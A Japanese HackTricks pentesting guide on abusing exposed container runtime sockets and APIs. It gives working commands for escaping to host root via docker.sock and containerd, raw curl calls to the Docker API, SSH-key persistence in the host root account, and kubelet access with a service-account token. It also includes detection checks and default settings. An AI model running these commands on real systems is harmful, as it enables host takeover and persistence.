# Runtime API と Daemon の露出

{{#include ../../../banners/hacktricks-training.md}}

## 概要

実際のコンテナ侵害の多くは、namespace escape から始まるわけではありません。runtime の control plane へのアクセスから始まります。ワークロードが、マウントされた Unix socket や公開された TCP listener 経由で `dockerd`、`containerd`、CRI-O、Podman、kubelet と通信できる場合、攻撃者はより高い権限を持つ新しいコンテナの作成、host filesystem のマウント、host namespace への参加、機密性の高い node 情報の取得を要求できる可能性があります。この場合、runtime API が実質的なセキュリティ境界であり、その侵害は事実上、host の侵害に近いものです。

このため、runtime socket の露出は kernel の保護とは分けて記録すべきです。通常の seccomp、capability、MAC による制限が適用されたコンテナでも、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部にマウントされていれば、API 呼び出しひとつで host が侵害される可能性があります。現在のコンテナに対する kernel isolation が設計どおりに機能していても、runtime の管理 plane が完全に露出していることがあります。

## Daemon へのアクセスモデル

Docker Engine は従来、`unix:///var/run/docker.sock` のローカル Unix socket 経由で、特権を持つ API を公開してきました。また、歴史的には `tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じてリモートにも公開されていました。強力な TLS と client 認証なしで daemon をリモート公開すると、実質的に Docker API がリモート root インターフェースになります。

containerd、CRI-O、Podman、kubelet も同様に影響の大きい攻撃対象領域を公開しています。名前やワークフローは異なりますが、仕組みは同じです。呼び出し元がワークロードの作成、host path のマウント、認証情報の取得、実行中コンテナの変更を行えるインターフェースは、特権を持つ管理チャネルであり、それに応じた扱いが必要です。

コンテナ管理用の web UI も、ローカルアカウントに socket への直接アクセスを与えることなく、同じ境界を露出させる可能性があります。たとえば、[Portainer issue #493](https://github.com/portainer/portainer/issues/493) では、旧版 1.11.1 における認証不要の administrator password reset が記録されています。ローカルから到達可能な UI は、あくまで調査の手がかりとして扱ってください。インストール済みビルドと認証動作、実際に administrator 権限を制御できるか、管理対象の endpoint で書き込み可能な host bind mount を使ってコンテナを作成できるかを確認してください。[Portainer のドキュメント](https://docs.portainer.io/admin/environments/add/docker/socket)によると、socket を使った管理には Docker socket へのアクセスが必要です。rootless または制限された endpoint では、host への影響が異なります。プロセス名、port、version string だけから、認証上の欠陥や host-root access があると推測しないでください。

確認すべき一般的なローカルパスは次のとおりです。

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

古い環境や、より特殊なスタックでは、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などのエンドポイントが公開されている場合もあります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常のアプリケーションソケットではなくランタイム制御用のインターフェースであるため、同様に注意して扱う必要があります。

## Secure Remote Access

デーモンをローカルソケットの外部に公開する必要がある場合、接続は TLS で保護し、できれば相互認証を有効にして、デーモンがクライアントを検証し、クライアントがデーモンを検証できるようにする必要があります。利便性のために Docker デーモンを平文 HTTP で公開する昔ながらの習慣は、コンテナ管理における最も危険なミスの一つです。これは、API の機能が強力で、特権コンテナを直接作成できるためです。

歴史的な Docker の設定パターンは次のようなものでした：

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemdベースのホストでは、デーモンとの通信が `fd://` として現れることもあります。これは、デーモン自身がソケットを直接バインドするのではなく、systemdから事前に開かれたソケットをプロセスが引き継ぐことを意味します。重要なのは正確な構文ではなく、セキュリティ上の影響です。デーモンが厳格な権限設定のローカルソケットを超えてリッスンした時点で、トランスポートセキュリティとクライアント認証は、任意の強化策ではなく必須になります。

## Abuse

runtime socketが存在する場合は、それがどのsocketなのか、互換性のあるクライアントがあるか、raw HTTPまたはgRPCでアクセスできるかを確認します。

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

これらのコマンドは、存在しないパス、マウントされているがアクセスできないソケット、稼働中の特権 API を区別するのに役立ちます。クライアントから接続できた場合、次に確認すべきなのは、その API を使ってホストの bind mount またはホスト namespace の共有を指定した新しいコンテナを起動できるかどうかです。

### クライアントがインストールされていない場合

`docker`、`podman`、その他の使いやすい CLI が存在しなくても、ソケットが安全とは限りません。Docker Engine は Unix ソケット経由で HTTP を扱い、Podman は `podman system service` を通じて、Docker 互換 API と Libpod ネイティブ API の両方を公開しています。つまり、`curl` しかない最小限の環境でも、デーモンを操作できる可能性があります。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

PHP code execution が `open_basedir` に制限されている場合でも、PHP プロセスに接続する OS 権限があれば、[Unix socket 接続は別の経路として残ります](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir)。

これは post-exploitation で重要です。防御側が通常のクライアントバイナリを削除しても、管理 socket はマウントされたままの場合があるためです。Podman ホストでは、rootful と rootless のデプロイで重要なパスが異なることに注意してください。rootful サービスインスタンスでは `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### 完全な例: Docker Socket からホストの root へ

`docker.sock` にアクセスできる場合、古典的な escape は、ホストの root ファイルシステムをマウントした新しいコンテナを起動し、その中で `chroot` を実行する方法です。

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

これはDocker daemonを通じて、ホストのroot権限で直接実行できる状態をもたらします。影響はファイルの読み取りにとどまりません。新しいcontainer内に入った攻撃者は、ホスト上のファイルを改変したり、認証情報を収集したり、永続化を仕込んだり、追加の特権ワークロードを起動したりできます。

### 完全な例: Docker Socket からホストのNamespacesへ

攻撃者がファイルシステムだけにアクセスするのではなく、namespaceへの侵入を選ぶ場合:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

この経路では、現在のコンテナを exploit するのではなく、runtime に明示的な host namespace の公開を伴う新しいコンテナを作成させて、host に到達します。

### Docker Socket Persistence Pattern

runtime の制御は、一度限りの shell ではなく、persistence にも利用できます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に認可済みのアクセス情報または startup hook を書き込み、host がそれを読み込むことを検証する方法です。

例：

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

同じ考え方で、運用者が証明したい内容に応じて、systemd units、cron fragments、アプリケーションの起動ファイル、SSH keysを対象にできます。重要なのは、永続的な変更が元のコンテナ内で追加の権限を得て行われるのではなく、runtime daemonが持つホストレベルのファイルシステム権限を通じて行われることです。

### Raw Docker API Helper Pivot

Docker CLIがない場合、同じホストマウントのhelperフローを、Unix socket経由のHTTPで実行できます。一般的な流れは、APIを確認し、ホストのbind mountを使うhelper containerを作成して起動し、exec instanceを作成して、そのexecを開始することです。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

最終的な`/exec/<id>/start`リクエストは、返されたexec IDに依存しますが、セキュリティ上の要点は具体的なJSON処理とは無関係です。rootful Docker daemonへのraw APIアクセスがあれば、より強力なヘルパーワークロードを要求できます。

### 完全な例: containerd Socket

マウントされた`containerd` socketも、通常は同じくらい危険です:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

より Docker に近いクライアントが利用できる場合、`nerdctl` は `--privileged`、`--pid=host`、`-v` などの見慣れたフラグを使えるため、`ctr` より便利です。

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

影響はやはりホストの侵害です。Docker固有のツールがなくても、別のruntime APIが同じ管理権限を提供している可能性があります。Kubernetesノードでは、`crictl`もCRIエンドポイントに直接接続するため、偵察やコンテナ操作に十分な場合があります。

### BuildKit Socket

`buildkitd`は、単なる「ビルドバックエンド」と考えられがちなため見落とされやすいものの、このデーモンは依然として特権を持つコントロールプレーンです。アクセス可能な`buildkitd.sock`があると、攻撃者は任意のビルドステップを実行し、workerの機能を調べ、侵害された環境のローカルコンテキストを利用できます。また、デーモンが許可する設定になっていれば、`network.host`や`security.insecure`などの危険なentitlementを要求できます。

最初に試すとよい操作は次のとおりです。

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

デーモンがビルドリクエストを受け付ける場合は、insecure entitlements が利用可能かテストします。

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

影響の具体的な範囲は daemon の設定によって異なりますが、entitlements が permissive な rootful BuildKit service は、無害な開発者向けの利便機能ではありません。特に CI runners や共有 build node では、価値の高い管理用 attack surface として扱ってください。

### Kubelet API Over TCP

kubelet は container runtime ではありませんが、node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。kubelet の secure port `10250` に workload から到達できる場合や、node credentials、kubeconfigs、proxy 権限が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pod の列挙、ログの取得、node-local container でのコマンド実行を行える可能性があります。

まずは手軽な discovery から始めます:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

kubelet または API-server proxy の経路で `exec` が許可されている場合、WebSocket に対応したクライアントを使うことで、ノード上の他のコンテナでコードを実行できます。これが、`get` 権限しかなくても `nodes/proxy` が聞こえる以上に危険な理由でもあります。リクエストはコマンドを実行する kubelet エンドポイントに到達でき、こうした kubelet への直接的な操作は通常の Kubernetes audit log には記録されません。<sup>[[2]](#references)</sup>

## Checks

これらのチェックでは、コンテナが信頼境界の外にあるべき管理プレーンに到達できるかどうかを確認します。

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

ここで注目すべき点:

- マウントされた runtime socket は、単なる情報開示ではなく、通常は直接的な管理操作手段となります。
- TLS なしで `2375` をリッスンする TCP listener は、リモート侵害につながる状態として扱うべきです。
- `DOCKER_HOST` などの環境変数から、workload がホストの runtime と通信するよう意図的に設計されていることが分かる場合があります。

## Runtime のデフォルト設定

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動でのセキュリティ低下 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカルの Unix socket | `dockerd` はローカル socket でリッスンし、通常 daemon は rootful で動作します | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` での TLS の不備または未設定 |
| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では、常時稼働する特権 daemon は不要です。`podman system service` が有効な場合、API socket が公開されることがあります | `podman.sock` の公開、service の広範な公開、rootful API の使用 |
| containerd | ローカルの特権 socket | 管理 API はローカル socket 経由で公開され、通常は上位レイヤーのツールから利用されます | `containerd.sock` のマウント、広範な `ctr` または `nerdctl` へのアクセス、特権 namespace の公開 |
| CRI-O | ローカルの特権 socket | CRI endpoint はノード内の信頼されたコンポーネント向けです | `crio.sock` のマウント、信頼されていない workload への CRI endpoint の公開 |
| Kubernetes kubelet | ノード内の管理 API | kubelet は Pod から広範に到達できる状態にすべきではありません。認証・認可の設定によっては、アクセスにより Pod の状態、認証情報、実行機能が露出する可能性があります | kubelet socket または証明書のマウント、kubelet の認証の不備、host networking と到達可能な kubelet endpoint の併用 |



## References

- [1] [containerd socket の悪用 パート1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server のバイパスリスク](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
